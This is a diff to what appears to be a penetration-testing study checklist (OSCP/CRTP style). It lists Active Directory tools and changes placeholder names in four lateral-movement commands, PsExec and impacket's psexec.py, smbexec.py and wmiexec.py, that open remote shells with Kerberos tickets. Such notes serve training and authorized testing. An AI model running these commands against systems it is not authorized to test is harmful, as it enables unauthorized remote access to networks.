@@ -2,7 +2,7 @@
 - [AD]
   - Kerbrute
   - Rubeus
-- Lat Move
+- [Lat Move](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md)
 - [Enumerate Services](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#enumerate-services)
   - [SMB]
   - [SNMP]
@@ -84,13 +84,13 @@ You may already have a shell!
 
 
 #### Lat Move
-```PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd```
+```PsExec.exe -accepteula \\$HOSTNAME cmd```
 
-```psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass```
+```psexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
 
-```smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass```
+```smbexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
 
-```wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass```
+```wmiexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
 
 # Enumerate Services
 
